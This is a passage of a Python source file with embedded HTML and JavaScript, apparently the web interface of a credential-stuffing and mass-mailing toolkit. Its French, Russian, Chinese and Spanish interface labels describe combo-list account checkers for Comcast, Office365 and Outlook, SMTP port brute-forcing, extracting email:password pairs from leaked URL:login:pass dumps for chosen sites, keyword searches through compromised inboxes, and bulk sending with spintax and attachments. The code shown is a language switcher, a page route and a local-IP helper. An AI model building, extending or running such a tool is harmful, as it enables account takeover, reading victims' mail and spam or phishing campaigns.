            "lbl-target-session": "Session Cible:", "lbl-select-account": "Sélectionnez un Compte", "lbl-select-msg": "Sélectionnez un message pour afficher le contenu",
            "lbl-smtp-threads": "THREADS", "lbl-brute-ports": "BRUTE PORTS (25, 2525, 465, 587)", "lbl-smtp-combos": "COMBOS SMTP",
            "lbl-ultra-fast": "EXTRACTION ULTRA-RAPIDE (POUR 10GB+)", "lbl-pro-tip": "CONSEIL:", "lbl-status-comcast": "Statut",
            "lbl-comcast-combos": "COMPTES COMCAST", "lbl-comcast-title": "⚡ COMCAST CHECKER", "lbl-comcast-desc": "Teste la connectivité SMTP via:",
            "lbl-status-office": "Statut", "lbl-office-combos": "COMPTES OFFICE365", "lbl-office-title": "⚡ OFFICE365 CHECKER",
            "lbl-recipient-list": "LISTE DESTINATAIRES", "lbl-smtp-list": "LISTE SMTP (AUTO)", "lbl-letter-settings": "RÉGLAGES LETTRE (Supports Spintax)",
            "lbl-live-preview": "APERÇU LIVE", "lbl-attachment": "PIÈCE JOINTE (.html, .txt, .pdf)", "lbl-send-delay": "DÉLAI ENVOI", "lbl-sec-per-email": "SECONDES PAR EMAIL",
            "lbl-send-threads": "THREADS", "lbl-send-retries": "MAX SMTP TRIES", "lbl-retries-hint": "0 = Tester TOUS les SMTP.", "lbl-gs-scan-prefix": "Le système va scanner",
            "lbl-gs-scan-suffix": "comptes de votre fichier Valid.txt.", "lbl-gs-total": "TOTAL", "lbl-gs-matches": "MATCHES", "lbl-gs-hint": "Entrez un mot-clé pour chercher dans tous les comptes.",
            "lbl-out-threads": "THREADS", "lbl-out-keywords": "🔑 MOTS-CLÉS (Optionnel - Laisser vide pour simple login)", "lbl-out-combos": "LISTE COMBO",
            "lbl-out-how": "ℹ️ Fonctionnement:", "lbl-out-how-desc": "• Si vide → Valide login (rapide)<br/>• Si mots-clés → Valide login + cherche dans inbox",
            "title-extractors": "Extracteur ULP & Combo Ultra-Rapide", "title-ulp-ext": "ULP vers Email:Pass (Support 5GB+)", "lbl-ulp-file": "CHEMIN DU FICHIER ULP (URL:LOGIN:PASS)",
            "lbl-ulp-keyword": "SITE CIBLE / MOT-CLÉ (ex: walmart, netflix, .it)", "lbl-only-emails": "EXTRAIRE UNIQUEMENT EMAIL:PASS",
            "btn-ulp-start": "DÉMARRER L'EXTRACTION ULP", "title-combo-sort": "Trieur de Combo par Domaine", "lbl-sort-input": "COLLER LES COMBOS OU CHARGER UN FICHIER"
        },
        "RU": {
            "nav-scan-text": "СКАНЕР", "nav-acc-text": "АККАУНТЫ", "nav-man-text": "РУЧНОЙ", "nav-view-text": "СМОТР", 
            "nav-smtp-text": "SMTP ЧЕКЕР", "nav-send-text": "ОТПРАВИТЕЛЬ", "nav-search-text-global": "ИСКАТЬ ВЕЗДЕ", 
            "nav-outlook-text": "OUTLOOK ЧЕКЕР", "nav-comcast-text": "COMCAST ЧЕКЕР", "nav-office365-text": "OFFICE365 ЧЕКЕР", 
            "nav-hist-text": "ЛОГИ", "nav-settings-text": "НАСТРОЙКИ", "nav-extract-text": "ЭКСТРАКТОРЫ",
            "btn-scan-d": "Найти домены", "btn-clear-dash": "Очистить", "btn-start": "Запустить чекер", "btn-stop": "Остановить двигатель", "btn-clear-session": "Очистить сессию",
            "btn-manual-connect": "Подключиться и войти", "btn-acc-prev": "ПРЕД", "btn-acc-next": "СЛЕД",
            "btn-view-batch": "Скачать пакет", "btn-view-prev": "Пред", "btn-view-next": "След", "btn-toggle-type": "HTML/ТЕКСТ",
            "btn-view-fwd": "ПЕРЕСЛАТЬ", "btn-view-del": "УДАЛИТЬ", "btn-view-down": "СКАЧАТЬ",
            "btn-clear-db": "ОЧИСТИТЬ БАЗУ", "btn-smtp-browse": "ОБЗОР", "btn-combo-browse": "ОБЗОР", "btn-smtp-fast-ext": "Скоростное извлечение из файла",
            "btn-smtp-ext": "Извлечь SMTP из Email:Pass", "btn-smtp-start": "Начать проверку SMTP", "btn-smtp-stop": "Остановить",
            "btn-comcast-clear": "Очистить", "btn-comcast-start": "Начать проверку Comcast", "btn-comcast-stop": "Стоп",
            "btn-office-clear": "Очистить", "btn-office-start": "Начать проверку Office365", "btn-office-stop": "Стоп",
            "btn-send-load-emails": "Загрузить Emails.txt", "btn-send-load-body": "Загрузить письмо", "btn-send-load-smtps": "Загрузить SMTP",
            "btn-send-start": "Начать рассылку", "btn-send-stop": "Стоп", "btn-gs-start": "НАЧАТЬ ПОИСК", "btn-gs-stop": "СТОП",
            "btn-out-start": "Начать проверку Outlook", "btn-out-stop": "Стоп",
            "title-mass-discovery": "Движок массового поиска", "title-manual": "Одиночное соединение", "title-validated": "Проверенные аккаунты",
            "title-smtp": "SMTP Валидатор", "title-comcast": "Comcast SMTP Чекер", "title-office": "Office365/Outlook Чекер",
            "title-sender": "Массовая рассылка", "title-global-search": "Глобальный поиск", "title-outlook": "Outlook Чекер",
            "hist-title": "История хитов", "lbl-threads": "ПОТОКИ", "lbl-combos": "КОМБО ЛИСТ (USER:PASS)", "lbl-combo-file": "ИЛИ ЗАГРУЗИТЬ ИЗ ФАЙЛА (Полный путь к .txt)", "lbl-target-combo": "ЦЕЛЬ",
            "lbl-target-session": "Текущая сессия:", "lbl-select-account": "Выберите аккаунт", "lbl-select-msg": "Выберите сообщение для просмотра",
            "lbl-smtp-threads": "ПОТОКИ", "lbl-brute-ports": "ПЕРЕБОР ПОРТОВ (25, 2525, 465, 587)", "lbl-smtp-combos": "SMTP КОМБО",
            "lbl-ultra-fast": "УЛЬТРА-БЫСТРОЕ ИЗВЛЕЧЕНИЕ (ДЛЯ 10GB+)", "lbl-pro-tip": "СОВЕТ:", "lbl-status-comcast": "Статус",
            "lbl-comcast-combos": "АККАУНТЫ COMCAST", "lbl-comcast-title": "⚡ COMCAST ЧЕКЕР", "lbl-comcast-desc": "Тест SMTP через:",
            "lbl-status-office": "Статус", "lbl-office-combos": "АККАУНТЫ OFFICE365", "lbl-office-title": "⚡ OFFICE365 ЧЕКЕР",
            "lbl-recipient-list": "СПИСОК ПОЛУЧАТЕЛЕЙ", "lbl-smtp-list": "СПИСОК SMTP (АВТО)", "lbl-letter-settings": "НАСТРОЙКИ ПИСЬМА (Spintax)",
            "lbl-live-preview": "ПРЕДПРОСМОТР", "lbl-attachment": "ВЛОЖЕНИЕ (.html, .txt, .pdf)", "lbl-send-delay": "ЗАДЕРЖКА", "lbl-sec-per-email": "СЕК НА ПИСЬМО",
            "lbl-send-threads": "ПОТОКИ", "lbl-send-retries": "ПОПЫТКИ SMTP", "lbl-retries-hint": "0 = Тест ВСЕХ SMTP.", "lbl-gs-scan-prefix": "Система проверит",
            "lbl-gs-scan-suffix": "аккаунтов из файла Valid.txt.", "lbl-gs-total": "ВСЕГО", "lbl-gs-matches": "НАЙДЕНО", "lbl-gs-hint": "Введите слово для поиска по всем аккаунтам.",
            "lbl-out-threads": "ПОТОКИ", "lbl-out-keywords": "🔑 КЛЮЧЕВЫЕ СЛОВА (Опционально)", "lbl-out-combos": "КОМБО ЛИСТ",
            "lbl-out-how": "ℹ️ Как это работает:", "lbl-out-how-desc": "• Пусто → Только вход (быстро)<br/>• Со словами → Вход + поиск в почте",
            "title-extractors": "Скоростной ULP и комбо экстрактор", "title-ulp-ext": "ULP в Email:Pass (поддержка 5GB+)", "lbl-ulp-file": "ПУТЬ К ULP ФАЙЛУ (URL:LOGIN:PASS)",
            "lbl-ulp-keyword": "ЦЕЛЕВОЙ САЙТ / КЛЮЧЕВОЕ СЛОВО (напр. walmart, netflix, .ru)", "lbl-only-emails": "ИЗВЛЕКАТЬ ТОЛЬКО EMAIL:PASS",
            "btn-ulp-start": "НАЧАТЬ ИЗВЛЕЧЕНИЕ ULP", "title-combo-sort": "Сортировка комбо по доменам", "lbl-sort-input": "ВСТАВЬТЕ КОМБО ИЛИ ЗАГРУЗИТЕ ФАЙЛ"
        },
        "CN": {
            "nav-scan-text": "扫描", "nav-acc-text": "账户", "nav-man-text": "手动", "nav-view-text": "查看", 
            "nav-smtp-text": "SMTP检测", "nav-send-text": "发送", "nav-search-text-global": "搜索全部", 
            "nav-outlook-text": "Outlook 检测", "nav-comcast-text": "Comcast 检测", "nav-office365-text": "Office365 检测", 
            "nav-hist-text": "历史", "nav-settings-text": "设置", "nav-extract-text": "提取器",
            "btn-scan-d": "发现域名", "btn-clear-dash": "清除", "btn-start": "启动检测器", "btn-stop": "停止引擎", "btn-clear-session": "清除会话",
            "btn-manual-connect": "连接并查看收件箱", "btn-acc-prev": "上页", "btn-acc-next": "下页",
            "btn-view-batch": "批量下载", "btn-view-prev": "上页", "btn-view-next": "下页", "btn-toggle-type": "HTML/文本",
            "btn-view-fwd": "转发", "btn-view-del": "删除", "btn-view-down": "下载",
            "btn-clear-db": "清除数据库", "btn-smtp-browse": "浏览", "btn-combo-browse": "浏览", "btn-smtp-fast-ext": "从本地文件高速提取",
            "btn-smtp-ext": "从Email:Pass提取SMTP", "btn-smtp-start": "启动SMTP检测", "btn-smtp-stop": "停止引擎",
            "btn-comcast-clear": "清除", "btn-comcast-start": "启动Comcast检测", "btn-comcast-stop": "停止",
            "btn-office-clear": "清除", "btn-office-start": "启动Office365检测", "btn-office-stop": "停止",
            "btn-send-load-emails": "加载Emails.txt", "btn-send-load-body": "加载邮件正文", "btn-send-load-smtps": "加载在线SMTP",
            "btn-send-start": "开始发送", "btn-send-stop": "停止", "btn-gs-start": "开始扫描", "btn-gs-stop": "停止",
            "btn-out-start": "启动Outlook检测", "btn-out-stop": "停止",
            "title-mass-discovery": "批量发现引擎", "title-manual": "单点连接", "title-validated": "已验证账户",
            "title-smtp": "SMTP 验证器", "title-comcast": "Comcast SMTP 检测器", "title-office": "Office365/Outlook 检测器",
            "title-sender": "群发邮件器", "title-global-search": "全局关键词搜索", "title-outlook": "Outlook 检测器",
            "hist-title": "命中历史", "lbl-threads": "线程数", "lbl-combos": "组合列表 (USER:PASS)", "lbl-combo-file": "或从文件加载 ( .txt 文件的完整路径)", "lbl-target-combo": "目标组合",
            "lbl-target-session": "当前会话:", "lbl-select-account": "请先选择账户", "lbl-select-msg": "选择邮件以显示内容",
            "lbl-smtp-threads": "线程数", "lbl-brute-ports": "爆破端口 (25, 2525, 465, 587)", "lbl-smtp-combos": "SMTP 组合",
            "lbl-ultra-fast": "超高速提取 (针对 10GB+ 文件)", "lbl-pro-tip": "专业提示:", "lbl-status-comcast": "状态",
            "lbl-comcast-combos": "Comcast 账户", "lbl-comcast-title": "⚡ Comcast 检测器", "lbl-comcast-desc": "通过以下方式测试 SMTP 连接:",
            "lbl-status-office": "状态", "lbl-office-combos": "Office365 账户", "lbl-office-title": "⚡ Office365 检测器",
            "lbl-recipient-list": "收件人列表", "lbl-smtp-list": "SMTP 列表 (自动加载)", "lbl-letter-settings": "邮件设置 (支持 Spintax)",
            "lbl-live-preview": "实时预览", "lbl-attachment": "附件 (.html, .txt, .pdf)", "lbl-send-delay": "发送延迟", "lbl-sec-per-email": "每封邮件秒数",
            "lbl-send-threads": "线程数", "lbl-send-retries": "最大 SMTP 重试", "lbl-retries-hint": "0 = 测试所有 SMTP。", "lbl-gs-scan-prefix": "系统将扫描",
            "lbl-gs-scan-suffix": "个 Valid.txt 中的账户。", "lbl-gs-total": "总计", "lbl-gs-matches": "匹配项", "lbl-gs-hint": "输入关键词以搜索所有已验证账户。",
            "lbl-out-threads": "线程数", "lbl-out-keywords": "🔑 关键词 (可选 - 留空则仅验证登录)", "lbl-out-combos": "组合列表",
            "lbl-out-how": "ℹ️ 工作原理:", "lbl-out-how-desc": "• 如果为空 → 仅验证登录 (快速)<br/>• 如果提供关键词 → 验证登录 + 搜索收件箱",
            "title-extractors": "高速 ULP 和组合提取器", "title-ulp-ext": "ULP 转 Email:Pass (支持 5GB+)", "lbl-ulp-file": "ULP 文件路径 (URL:LOGIN:PASS)",
            "lbl-ulp-keyword": "目标网站 / 关键词 (如 walmart, netflix, .cn)", "lbl-only-emails": "仅提取 EMAIL:PASS",
            "btn-ulp-start": "开始 ULP 提取", "title-combo-sort": "按域名排序组合", "lbl-sort-input": "粘贴组合或加载文件"
        },
        "ES": {
            "nav-scan-text": "ESCÁNER", "nav-acc-text": "CUENTAS", "nav-man-text": "MANUAL", "nav-view-text": "VISTA", 
            "nav-smtp-text": "SMTP CHECKER", "nav-send-text": "REMITENTE", "nav-search-text-global": "BUSCAR TODO", 
            "nav-outlook-text": "OUTLOOK CHK", "nav-comcast-text": "COMCAST CHK", "nav-office365-text": "OFFICE365 CHK", 
            "nav-hist-text": "LOGS", "nav-settings-text": "AJUSTES", "nav-extract-text": "EXTRACTORES",
            "btn-scan-d": "Descubrir dominios", "btn-clear-dash": "Limpiar", "btn-start": "Iniciar Checker", "btn-stop": "Detener Motor", "btn-clear-session": "Limpiar Sesión",
            "btn-manual-connect": "Conectar y Ver Inbox", "btn-acc-prev": "ANT", "btn-acc-next": "SIG",
            "btn-view-batch": "Descargar Lote", "btn-view-prev": "Ant", "btn-view-next": "Sig", "btn-toggle-type": "HTML/TEXTO",
            "btn-view-fwd": "REENVIAR", "btn-view-del": "ELIMINAR", "btn-view-down": "DESCARGAR",
            "btn-clear-db": "LIMPIAR BASE", "btn-smtp-browse": "BUSCAR", "btn-combo-browse": "BUSCAR", "btn-smtp-fast-ext": "Extracción Rápida Archivo Local",
            "btn-smtp-ext": "Extraer SMTP de Email:Pass", "btn-smtp-start": "Iniciar SMTP Checker", "btn-smtp-stop": "Detener Motor",
            "btn-comcast-clear": "Limpiar", "btn-comcast-start": "Iniciar Comcast Checker", "btn-comcast-stop": "Detener",
            "btn-office-clear": "Limpiar", "btn-office-start": "Iniciar Office365 Checker", "btn-office-stop": "Detener",
            "btn-send-load-emails": "Cargar Emails.txt", "btn-send-load-body": "Cargar Carta.html", "btn-send-load-smtps": "Cargar SMTPs Live",
            "btn-send-start": "Iniciar Envío", "btn-send-stop": "Detener", "btn-gs-start": "INICIAR ESCANEO", "btn-gs-stop": "DETENER",
            "btn-out-start": "Iniciar Outlook Checker", "btn-out-stop": "Detener",
            "title-mass-discovery": "Motor de Descubrimiento", "title-manual": "Conexión Única", "title-validated": "Cuentas Validadas",
            "title-smtp": "Validador SMTP", "title-comcast": "Checker Comcast SMTP", "title-office": "Checker Office365/Outlook",
            "title-sender": "Envío de Correo Masivo", "title-global-search": "Búsqueda Global", "title-outlook": "Checker Outlook",
            "hist-title": "Historial de Hits", "lbl-threads": "HILOS", "lbl-combos": "LISTA COMBO (USER:PASS)", "lbl-combo-file": "O CARGAR DESDE ARCHIVO (Ruta completa .txt)", "lbl-target-combo": "COMBO OBJETIVO",
            "lbl-target-session": "Sesión Objetivo:", "lbl-select-account": "Seleccione Cuenta Primero", "lbl-select-msg": "Seleccione un mensaje para ver el contenido",
            "lbl-smtp-threads": "HILOS", "lbl-brute-ports": "BRUTE PORTS (25, 2525, 465, 587)", "lbl-smtp-combos": "COMBOS SMTP",
            "lbl-ultra-fast": "EXTRACCIÓN ULTRA-RÁPIDA (PARA 10GB+)", "lbl-pro-tip": "PRO TIP:", "lbl-status-comcast": "Estado",
            "lbl-comcast-combos": "CUENTAS COMCAST", "lbl-comcast-title": "⚡ COMCAST CHECKER", "lbl-comcast-desc": "Prueba conectividad SMTP vía:",
            "lbl-status-office": "Estado", "lbl-office-combos": "CUENTAS OFFICE365", "lbl-office-title": "⚡ OFFICE365 CHECKER",
            "lbl-recipient-list": "LISTA DESTINATARIOS", "lbl-smtp-list": "LISTA SMTP (AUTO)", "lbl-letter-settings": "AJUSTES CARTA (Soporta Spintax)",
            "lbl-live-preview": "VISTA PREVIA", "lbl-attachment": "ADJUNTO (.html, .txt, .pdf)", "lbl-send-delay": "RETRASO ENVÍO", "lbl-sec-per-email": "SEGUNDOS POR CORREO",
            "lbl-send-threads": "HILOS", "lbl-send-retries": "MÁX REINTENTOS SMTP", "lbl-retries-hint": "0 = Probar TODOS los SMTP.", "lbl-gs-scan-prefix": "El sistema escaneará",
            "lbl-gs-scan-suffix": "cuentas de su archivo Valid.txt.", "lbl-gs-total": "TOTAL", "lbl-gs-matches": "COINCIDENCIAS", "lbl-gs-hint": "Ingrese palabra clave para buscar en todas las cuentas.",
            "lbl-out-threads": "HILOS", "lbl-out-keywords": "🔑 PALABRAS CLAVE (Opcional - Vacío para solo login)", "lbl-out-combos": "LISTA COMBO",
            "lbl-out-how": "ℹ️ Cómo funciona:", "lbl-out-how-desc": "• Si vacío → Valida login (rápido)<br/>• Si hay palabras → Valida login + busca en inbox",
            "title-extractors": "Extractor ULP & Combo de Alta Velocidad", "title-ulp-ext": "ULP a Email:Pass (Soporte 5GB+)", "lbl-ulp-file": "RUTA ARCHIVO ULP (URL:LOGIN:PASS)",
            "lbl-ulp-keyword": "SITIO OBJETIVO / PALABRA CLAVE (ej: walmart, netflix, .es)", "lbl-only-emails": "SOLO EXTRAER EMAIL:PASS",
            "btn-ulp-start": "INICIAR EXTRACCIÓN ULP", "title-combo-sort": "Organizador de Combo por Dominio", "lbl-sort-input": "PEGAR COMBOS O CARGAR ARCHIVO"
        }
    };

    function setLang(l){
        var d = dict[l] || dict['EN'];
        for (var key in d) {
            var el = document.getElementById(key);
            if(el) {
                if (el.tagName === 'INPUT' && (el.type === 'button' || el.type === 'submit' || el.type === 'text' || el.type === 'number')) {
                     if(el.type === 'button' || el.type === 'submit') el.value = d[key];
                     else if(el.placeholder) el.placeholder = d[key];
                }
                else el.innerHTML = d[key];
            }
        }
        document.body.dir = (l == 'AR' ? 'rtl' : 'ltr');
    }

</script>
</body>
</html>
"""


@app.get("/", response_class=HTMLResponse)
def index():
    # Return as explicit UTF-8 byte stream with RAW string safely encoded
    return HTMLResponse(content=UI_HTML.encode('utf-8'), media_type="text/html; charset=utf-8")

def get_local_ip():
    # Try connecting to external or broadcast addresses to trigger routing table lookup without sending packets
    for target in [("8.8.8.8", 80), ("10.255.255.255", 1), ("192.168.255.255", 1), ("172.31.255.255", 1)]:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(target)
            ip = s.getsockname()[0]
            s.close()
            if ip and ip != "127.0.0.1" and not ip.startswith("169.254"):
                return ip
        except Exception:
            continue
    # Fallback to hostname lookup
    try:
        hostname = socket.gethostname()
        ips = socket.gethostbyname_ex(hostname)[2]
        for ip in ips:
            if not ip.startswith("127.") and not ip.startswith("169.254"):
                return ip
    except Exception:
        pass
    # Final fallback
    return "127.0.0.1"

